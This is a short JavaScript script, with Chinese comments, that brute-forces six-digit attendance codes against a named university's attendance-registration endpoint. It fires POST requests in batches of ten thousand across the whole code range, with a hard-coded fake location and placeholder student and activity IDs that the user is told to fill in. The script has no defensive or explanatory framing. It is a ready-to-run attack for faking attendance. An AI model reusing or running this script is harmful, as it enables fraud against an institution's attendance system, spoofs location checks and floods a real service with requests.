async function sendBatchRequests(start, end, batch) {
  let batchPromises = [];

  for (let i = start; i <= end; i += batch) {
    batchPromises = [];
    for (let j = i; j < i + batch && j <= end; j++) {
      let attCodeInputValue = j.toString().padStart(6, "0");
      batchPromises.push(
        fetch("https://timetables.liverpool.ac.uk/services/register-attendance-student", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          },
          // 请自行修改以下内容
          body: `attCodeInput=${attCodeInputValue}&uniqueId=UNIQUEID&actId=ACTID&attStart=12%2F03%2F2024+12%3A00&attEnd=12%2F03%2F2024+13%3A15&location=53.40998037885158%2C-2.958224235311767`,
        }).then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error('Error:', error))
      );
    }

    await Promise.all(batchPromises);
    console.log(`Batch from ${i} to ${Math.min(i + batch - 1, end)} completed.`);
    await new Promise((resolve) => setTimeout(resolve, 1000)); // 间隔时间
  }
}

sendBatchRequests(100000, 999999, 10000); // 分割的数量
